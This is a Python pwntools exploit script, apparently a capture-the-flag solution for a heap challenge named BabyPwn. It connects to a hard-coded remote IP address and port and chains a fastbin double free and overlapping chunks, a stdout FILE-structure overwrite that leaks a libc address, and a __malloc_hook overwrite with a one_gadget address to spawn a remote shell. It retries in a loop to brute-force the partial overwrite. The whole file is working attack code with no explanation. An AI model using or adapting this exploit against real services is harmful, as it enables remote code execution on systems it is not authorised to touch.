from pwn import *

context.arch='amd64'
context.terminal=['tmux', 'neww']
libc = ELF('./libc.so.6')

def add(name, size, content):
	r.sendlineafter(':', '1')
	r.sendafter(':', name)
	r.sendlineafter(':', str(size))
	r.sendafter(':', content)

def delete(idx):
	r.sendlineafter(':', '2')
	r.sendlineafter(':', str(idx))

def DEBUG():
	gdb.attach(r)

member = 0x602060
while True:
	try:
		#r = process('./BabyPwn')
		r = remote('124.156.209.69', 9999)
		add('0', 0x40, flat(0, 0x21)*4)
		add('1', 0x30, '1')
		add('2', 0x30, flat(0, 0x21))
		delete(0)
		delete(2)
		delete(1)
		delete(2)
		add('3', 0x30, '\x20')
		add('4', 0x30, flat(0, 0x21))
		add('5', 0x30, '1')
		add('6', 0x30, flat(0, 0x71))
		delete(0)
		delete(6)
		add('7', 0x30, flat(0, 0x71, 0x60203d))
		add('8', 0x60, 'a')
		delete(6)
		add('9', 0x60, p64(0)*12)
	
		add('0', 0x30, flat(0, 0x51))
		add('1', 0x40, 'a')
		delete(0)
		delete(1)
		add('2', 0x30, flat(0, 0x71))
		delete(1)
		delete(0)
		add('3', 0x30, flat(0, 0xc1))
		delete(1)
		delete(0)
		add('4', 0x30, flat(0, 0x71)+'\xdd\x15')
		add('5', 0x60, 'a')
		add(flat(0, 0x21), 0x60, '\x00'*3+flat(0)*6+flat(0xfbad1880, 0, 0, 0)+'\x00')
		print "recving..."
		libc_base = u64(r.recvuntil('\x7f')[-6:]+'\x00'*2)-0x3c5600
		one_gadget = [0x45216, 0x4526a, 0xf02a4, 0xf1147]
		one_shot = libc_base + one_gadget[3]
		print "libc_base @ ", hex(libc_base)
		malloc_hook = libc_base + libc.symbols['__malloc_hook']
		target = malloc_hook -0x23
		print "target @ ", hex(target)
		payload = '\x00'*3+p64(0)*2+p64(one_shot)
		delete(0)
		delete(1)
		add('7', 0x30, flat(0, 0x71, 0x60203d))
		add('8', 0x60, 'a')
		delete(0)
		add('9', 0x60, p64(0)*12)

		add('0', 0x30, flat(0, 0x51))
		add('1', 0x40, 'a')
		delete(0)
		add('2', 0x30, flat(0, 0x71))
		delete(1)
		delete(0)
		add('2', 0x30, flat(0, 0x71, target))
		add('3', 0x60, 'a')
		add('4', 0x60, payload)
		#DEBUG()
		r.sendlineafter(':', '1')
		
		r.interactive()
		break

	except EOFError:
		r.close()
		pass
	except KeyboardInterrupt:
		r.close()
		break

r.close()
